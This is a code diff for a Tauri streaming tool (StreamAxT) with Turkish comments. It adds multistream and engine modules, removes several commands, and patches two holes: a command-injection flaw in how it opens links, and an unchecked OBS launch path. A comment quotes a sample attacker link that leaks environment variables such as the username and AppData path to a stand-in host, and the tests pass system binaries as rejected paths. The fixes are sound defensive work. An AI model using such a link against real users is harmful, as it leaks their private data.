@@ -2,9 +2,20 @@
 
 #[macro_use]
 mod yya_log;
+mod close_prompt;
+pub mod streamaxt;
 pub mod db;
 pub mod kick;
 pub mod media;
+pub mod actions;
+pub mod destek;
+pub mod disk;
+pub mod eklenti;
+pub mod motor_koleksiyon;
+pub mod motor_obs_ice;
+pub mod motor_profil;
+pub mod motor_kopru;
+pub mod multistream;
 pub mod music;
 pub mod obs_client;
 pub mod hotkeys;
@@ -58,18 +69,17 @@ pub struct AppState {
   pub kick_session: Arc<kick::KickBotSession>,
   pub kick_chat: Arc<bot::kick_chat::KickChatRuntime>,
   pub obs: Arc<obs_client::ObsClientState>,
+  /// Çoklu yayın yönlendiricisi (tek kodlama → çok hedef)
+  pub multistream: Arc<multistream::Router>,
+  /// Yerel yayın çekirdeği (libobs, ayrı süreç) köprüsü
+  pub motor: Arc<motor_kopru::MotorKoprusu>,
+  /// Eklenti kayıt defterinin oku-değiştir-yaz işlemleri tek tek yapılsın (`<veri>/eklentiler/kayit.json`)
+  pub eklenti_kilidi: Arc<tokio::sync::Mutex<()>>,
   pub widget_rt: Arc<widget_runtime::WidgetRuntime>,
   pub emote_combo: Arc<widgets::ComboMemory>,
   pub bot_activity: bot::activity::BotActivityLog,
   pub tx: broadcast::Sender<String>,
   pub db: SqlitePool,
-}
-
-#[derive(Debug, Serialize, Deserialize, Clone)]
-pub struct ServerInfo {
-  pub port: u16,
-  pub base_url: String,
-  pub overlays: OverlayUrls,
 }
 
 #[derive(Debug, Serialize, Deserialize, Clone)]
@@ -144,7 +154,15 @@ impl AppState {
       }
       pool
     });
+    let multistream = Arc::new(multistream::Router::new(tx.clone(), Arc::new(multistream::KeyringStore)));
+    multistream.set_ffmpeg(ytdl::ffmpeg_yolu(&data_dir));
+    multistream.load(multistream::config::parse_list(
+      settings.get(ScreenKind::Panel).get("multistream").unwrap_or(&serde_json::Value::Null),
+    ));
     Self {
+      multistream,
+      motor: Arc::new(motor_kopru::MotorKoprusu::default()),
+      eklenti_kilidi: Arc::new(tokio::sync::Mutex::new(())),
       music: Arc::new(music::MusicState::new(&data_dir)),
       ytdl: Arc::new(ytdl::YtdlState::new()),
       kick_auth: Arc::new(kick::KickAuth::new(&data_dir)),
@@ -187,84 +205,8 @@ impl AppState {
 }
 
 #[tauri::command]
-fn get_server_info(state: State<'_, AppState>) -> ServerInfo {
-  ServerInfo {
-    port: state.port,
-    base_url: state.base_url(),
-    overlays: state.overlay_urls(),
-  }
-}
-
-#[tauri::command]
-fn get_settings(state: State<'_, AppState>, screen: String) -> Result<serde_json::Value, String> {
-  let kind = ScreenKind::parse(&screen)?;
-  Ok(state.settings.read().get(kind).clone())
-}
-
-#[tauri::command]
-fn set_settings(
-  state: State<'_, AppState>,
-  screen: String,
-  data: serde_json::Value,
-) -> Result<(), String> {
-  let kind = ScreenKind::parse(&screen)?;
-  {
-    let mut s = state.settings.write();
-    s.set(kind, data.clone());
-    s.save_one(&state.data_dir, kind).map_err(|e| e.to_string())?;
-  }
-  state.broadcast_json(&serde_json::json!({
-    "type": "settings",
-    "screen": screen,
-    "data": data,
-  }));
-  Ok(())
-}
-
-#[tauri::command]
-fn patch_settings(
-  state: State<'_, AppState>,
-  screen: String,
-  patch: serde_json::Value,
-) -> Result<serde_json::Value, String> {
-  let kind = ScreenKind::parse(&screen)?;
-  let merged = {
-    let mut s = state.settings.write();
-    let current = s.get(kind).clone();
-    let merged = settings::deep_merge(current, patch);
-    s.set(kind, merged.clone());
-    // drag sırasında disk yazma yok — caller persist ile çağırır
-    merged
-  };
-  state.broadcast_json(&serde_json::json!({
-    "type": "settings",
-    "screen": screen,
-    "data": merged,
-  }));
-  Ok(merged)
-}
-
-#[tauri::command]
-fn persist_settings(state: State<'_, AppState>) -> Result<(), String> {
-  state
-    .settings
-    .read()
-    .save(&state.data_dir)
-    .map_err(|e| e.to_string())
-}
-
-#[tauri::command]
 async fn fetch_kick_chatroom(slug: String) -> Result<serde_json::Value, String> {
   kick::fetch_chatroom(&slug).await.map_err(|e| e.to_string())
-}
-
-#[tauri::command]
-fn media_http_url(state: State<'_, AppState>, path: String) -> Result<String, String> {
-  let stored = media::paths::normalize_for_storage(&path, &state.root, &state.base_url())
-    .map_err(|e| e.to_string())?;
-  media::paths::playable(&state.base_url(), &stored)
-    .map(|m| m.stream_url)
-    .map_err(|e| e.to_string())
 }
 
 /// 16-32 px'e küçülen tepsi simgesi. `icons/icon.png` (1024 px) doğrudan
@@ -294,11 +236,12 @@ fn setup_tray(app: &AppHandle) -> tauri::Result<()> {
     .menu(&menu)
     // Windows'ta sol tık pencereyi getirsin, menü sağ tıkta açılsın.
     .show_menu_on_left_click(false)
-    .tooltip("Yayın Yönetim Aracı — arka planda çalışıyor")
+    .tooltip("StreamAxT — arka planda çalışıyor")
     .on_menu_event(|app, event| match event.id.as_ref() {
       "quit" => {
         // Axum + tüm tokio görevlerini zorla sonlandır (app.exit asılı kalabiliyor)
         yya_log!("[tray] Çıkış — process::exit(0)");
+        streamaxt::shutdown();
         std::process::exit(0);
       }
       "show" => {
@@ -359,17 +302,43 @@ fn is_safe_web_url(url: &str) -> bool {
   lower.starts_with("http://") || lower.starts_with("https://")
 }
 
-/// `cmd /C start "" "<url>"` komut satırını kurar.
+/// Adresi Windows kabuğuyla (ShellExecuteW) varsayılan tarayıcıda açar.
 ///
-/// Kritik: adres **tırnak içinde** olmalı. `Command::arg` boşluk içermeyen
-/// argümanı tırnaklamadığı için OAuth adresindeki `&` işaretleri cmd.exe
-/// tarafından komut ayıracı sayılıyordu; tarayıcıya yalnızca ilk parametreye
-/// kadar olan kısım gidiyor (`...authorize?client_id=X`), Spotify de eksik
-/// istek yüzünden yetkilendirmeyi reddediyordu.
+/// Eskiden `cmd /C start "" "<url>"` kullanılıyordu. cmd.exe `%DEĞİŞKEN%`
+/// kalıplarını tırnak içinde bile genişletir: sohbette paylaşılan
+/// `https://kotu.example/?u=%USERNAME%&p=%APPDATA%` gibi bir bağlantıya
+/// tıklanınca kullanıcı adı ve klasör yolları saldırganın sunucusuna
+/// gidiyordu. ShellExecute kabuk ayrıştırması yapmaz (`&` de bölünmez) ve
+/// SEE_MASK_DOENVSUBST verilmedikçe ortam değişkeni genişletmez.
 #[cfg(target_os = "windows")]
-fn windows_start_command_line(url: &str) -> String {
-  // `start` ilk tırnaklı argümanı pencere başlığı sayar — boş "" gerekir.
-  format!("/C start \"\" \"{url}\"")
+fn shell_open(url: &str) -> Result<(), String> {
+  use windows::core::{w, HSTRING, PCWSTR};
+  use windows::Win32::System::Com::{
+    CoInitializeEx, CoUninitialize, COINIT_APARTMENTTHREADED, COINIT_DISABLE_OLE1DDE,
+  };
+  use windows::Win32::UI::Shell::ShellExecuteW;
+  use windows::Win32::UI::WindowsAndMessaging::SW_SHOWNORMAL;
+
+  let url = url.to_string();
+  // ShellExecute bazı işleyicileri COM ile çağırır; belgelerin önerdiği gibi
+  // STA başlatılmış ayrı bir iş parçacığında çalıştırılır.
+  std::thread::spawn(move || unsafe {
+    let com = CoInitializeEx(None, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
+    let hedef = HSTRING::from(url.as_str());
+    let sonuc = ShellExecuteW(None, w!("open"), &hedef, PCWSTR::null(), PCWSTR::null(), SW_SHOWNORMAL);
+    if com.is_ok() {
+      CoUninitialize();
+    }
+    // 32'den büyük değer başarı demektir (Win32 sözleşmesi).
+    let kod = sonuc.0 as isize;
+    if kod > 32 {
+      Ok(())
+    } else {
+      Err(format!("ShellExecute hata kodu {kod}"))
+    }
+  })
+  .join()
+  .map_err(|_| "Tarayıcı açma iş parçacığı çöktü".to_string())?
 }
 
 /// Adresi sistem tarayıcısında açar.
@@ -388,24 +357,7 @@ pub fn open_external_url(url: &str) -> Result<(), String> {
 
   #[cfg(target_os = "windows")]
   {
-    use std::os::windows::process::CommandExt;
-    /// Konsol penceresi yanıp sönmesin
-    const CREATE_NO_WINDOW: u32 = 0x0800_0000;
-
-    let err = match std::process::Command::new("cmd")
-      .raw_arg(windows_start_command_line(url))
-      .creation_flags(CREATE_NO_WINDOW)
-      .spawn()
-    {
-      Ok(_) => return Ok(()),
-      Err(e) => e.to_string(),
-    };
-    // Yedek yol: explorer kabuk ayrıştırması yapmaz.
-    std::process::Command::new("explorer")
-      .arg(url)
-      .spawn()
-      .map_err(|e| format!("Tarayıcı açılamadı ({err}; {e})"))?;
-    Ok(())
+    shell_open(url).map_err(|e| format!("Tarayıcı açılamadı: {e}"))
   }
   #[cfg(not(target_os = "windows"))]
   {
@@ -457,10 +409,31 @@ fn obs_already_running() -> bool {
   false
 }
 
+/// Kullanıcının seçtiği yol gerçekten OBS'in kendi yürütülebiliri mi?
+///
+/// `launch_obs` komutu ön yüzden yol alıyor; ad denetimi olmadan webview'de
+/// çalışan herhangi bir betik bu komutla diskteki HERHANGİ bir programı
+/// başlatabilirdi.
+fn is_obs_executable(path: &std::path::Path) -> bool {
+  path
+    .file_name()
+    .and_then(|n| n.to_str())
+    .map(|n| {
+      let n = n.to_ascii_lowercase();
+      n == "obs64.exe" || n == "obs32.exe" || n == "obs.exe"
+    })
+    .unwrap_or(false)
+}
+
 fn candidate_obs_paths(override_path: Option<&str>) -> Vec<PathBuf> {
   let mut out = Vec::new();
   if let Some(p) = override_path.map(str::trim).filter(|s| !s.is_empty()) {
-    out.push(PathBuf::from(p));
+    let p = PathBuf::from(p);
+    if is_obs_executable(&p) {
+      out.push(p);
+    } else {
+      yya_warn!("[obs] özel yol OBS yürütülebiliri değil, yok sayıldı: {}", p.display());
+    }
   }
   #[cfg(target_os = "windows")]
   {
@@ -526,17 +499,14 @@ mod open_in_browser_tests {
     assert!(!is_safe_web_url("https://x/\na"));
   }
 
-  #[cfg(target_os = "windows")]
   #[test]
-  fn oauth_url_stays_quoted_as_one_argument() {
-    let url = "https://accounts.spotify.com/authorize?client_id=abc&response_type=code&redirect_uri=http%3A%2F%2F127.0.0.1%3A8843%2Fapi%2Fplayer%2Fspotify%2Fcallback&scope=user-read-currently-playing";
-    let line = windows_start_command_line(url);
-    // Adres tek parça ve tırnak içinde olmalı; aksi halde cmd `&` görünce böler
-    assert_eq!(line, format!("/C start \"\" \"{url}\""));
-    assert!(line.contains("&response_type=code"), "parametreler kesilmemeli");
-    assert!(line.ends_with('"'));
-    // "" başlık argümanı korunmalı
-    assert!(line.starts_with("/C start \"\" \""));
+  fn obs_override_must_be_obs_itself() {
+    assert!(is_obs_executable(std::path::Path::new(r"D:\OBS\bin\64bit\obs64.exe")));
+    assert!(is_obs_executable(std::path::Path::new(r"C:\x\OBS.EXE")));
+    assert!(!is_obs_executable(std::path::Path::new(r"C:\Windows\System32\cmd.exe")));
+    assert!(!is_obs_executable(std::path::Path::new(r"C:\x\obs64.exe.bat")));
+    let adaylar = candidate_obs_paths(Some(r"C:\Windows\System32\calc.exe"));
+    assert!(adaylar.iter().all(|p| is_obs_executable(p)), "{adaylar:?}");
   }
 }
 
@@ -589,50 +559,6 @@ async fn music_poll_loop(state: AppState) {
   }
 }
 
-#[tauri::command]
-fn music_status(state: State<'_, AppState>) -> serde_json::Value {
-  state.music.status()
-}
-
-#[tauri::command]
-fn music_authorize_url(
-  state: State<'_, AppState>,
-  client_id: String,
-) -> Result<String, String> {
-  let redirect = format!("{}/api/player/spotify/callback", state.base_url());
-  state
-    .music
-    .spotify_authorize_url(&client_id, &redirect)
-    .map_err(|e| e.to_string())
-}
-
-#[tauri::command]
-fn music_set_source(state: State<'_, AppState>, source: String) {
-  state.music.set_source(&source);
-}
-
-#[tauri::command]
-fn music_disconnect(state: State<'_, AppState>, source: String) {
-  if source == "youtube-music" {
-    state.music.ytmd_disconnect();
-  } else {
-    state.music.spotify_disconnect();
-  }
-}
-
-#[tauri::command]
-async fn music_command(
-  state: State<'_, AppState>,
-  action: String,
-  source: Option<String>,
-) -> Result<(), String> {
-  let music = state.music.clone();
-  music
-    .command(&action, source.as_deref())
-    .await
-    .map_err(|e| e.to_string())
-}
-
 #[cfg_attr(mobile, tauri::mobile_entry_point)]
 /// WebView2'ye (Chromium) verilecek başlangıç bayrakları.
 ///
@@ -675,7 +601,7 @@ pub fn run() {
       return;
     }
     // WebView ayağa kalktıktan sonra etiketle (ayrı thread, gecikmeli).
-    audio_brand::start("Yayın Yönetim Aracı", None);
+    audio_brand::start("StreamAxT", None);
   }
 
   let mut root = std::env::current_exe()
@@ -727,26 +653,25 @@ pub fn run() {
 
   tauri::Builder::default()
     .plugin(tauri_plugin_dialog::init())
-    .plugin(tauri_plugin_fs::init())
-    .plugin(tauri_plugin_updater::Builder::new().build())
-    .plugin(tauri_plugin_process::init())
     // Sahne kısayolları işletim sistemi düzeyinde: tepsiye alınca da çalışsın.
     // Handler Rust'ta — WebView donunca JS geri çağrısı ölmesin diye.
     .plugin(hotkeys::build_plugin(hub_for_plugin).build())
     .manage(state)
     .manage(hub)
     .on_window_event(|window, event| {
-      // X → yalnızca ana panel tepsiye küçülsün. Kick login gerçekten kapanmalı
-      // (aksi halde gizli webview Kick sesini çalmaya devam eder + etiket çakışır).
+      // X → ana panelde sor (tepsiye küçült / kapat / vazgeç). Kick login gerçekten
+      // kapanmalı (aksi halde gizli webview Kick sesini çalmaya devam eder + etiket çakışır).
       if let tauri::WindowEvent::CloseRequested { api, .. } = event {
         if window.label() == "main" {
           api.prevent_close();
-          let _ = window.hide();
+          close_prompt::request(window.app_handle());
         }
       }
     })
     .setup(|app| {
       setup_tray(app.handle())?;
+      close_prompt::install(app.handle());
+      streamaxt::autostart();
       // OBS'e uygulama açılınca kendiliğinden bağlan (arayüzü beklemeden).
       tauri::async_runtime::spawn(obs_client::autoconnect_loop(app.handle().clone()));
       // Panel UI'yi gömülü asset yerine yerel HTTP sunucusundan yükle.
@@ -777,44 +702,20 @@ pub fn run() {
       Ok(())
     })
     .invoke_handler(tauri::generate_handler![
-      get_server_info,
-      get_settings,
-      set_settings,
-      patch_settings,
-      persist_settings,
       fetch_kick_chatroom,
-      media_http_url,
       commands::media_playable_urls,
-      commands::media_import_file,
       commands::alerts_list,
-      commands::alerts_get,
-      commands::alerts_upsert,
-      commands::alerts_delete,
       commands::alert_variants_list,
-      commands::alert_variants_upsert,
-      commands::alert_variants_delete,
-      commands::widgets_list,
-      commands::widgets_get,
-      commands::widgets_upsert,
-      commands::widgets_patch_config,
-      commands::widgets_delete,
-      commands::widgets_obs_url,
       open_in_browser,
       launch_obs,
-      music_status,
-      music_authorize_url,
-      music_set_source,
-      music_disconnect,
-      music_command,
       sync_global_hotkeys,
-      kick::login_window::open_kick_bot_login,
-      kick::login_window::close_kick_bot_login,
+      streamaxt::streamaxt_status,
+      streamaxt::streamaxt_start,
+      streamaxt::streamaxt_stop,
       kick::login_window::open_kick_login_in_browser,
-      kick::login_window::ingest_kick_bot_cookie_header,
       kick::login_window::import_kick_session_from_browser,
       kick::login_window::harvest_kick_bot_cookies,
       kick::login_window::kick_bot_session_status,
-      kick::login_window::kick_bot_session_disconnect,
       obs_client::connect_obs,
       obs_client::obs_get_status,
       obs_client::obs_disconnect,
@@ -829,8 +730,21 @@ pub fn run() {
       obs_client::obs_stop_stream_sequence,
       obs_client::obs_cancel_sequence,
     ])
-    .run(tauri::generate_context!())
-    .expect("error while running tauri application");
+    .build(tauri::generate_context!())
+    .expect("error while running tauri application")
+    .run(|app, event| {
+      // Uygulama kapanırken yayın motoru düzgün durdurulur (çıktılar biter, kayıt kapanır) ve oturum işareti
+      // silinir; aksi hâlde bir sonraki açılış bunu "temiz kapanmadı" sayardı.
+      if let tauri::RunEvent::Exit = event {
+        let state = app.state::<AppState>();
+        let motor = state.motor.clone();
+        let dizin = state.data_dir.join("motor");
+        tauri::async_runtime::block_on(async move {
+          let _ = tokio::time::timeout(std::time::Duration::from_secs(15), motor.durdur()).await;
+        });
+        eklenti::kayit::oturum_bitti(&dizin);
+      }
+    });
 }
 
 #[tauri::command]
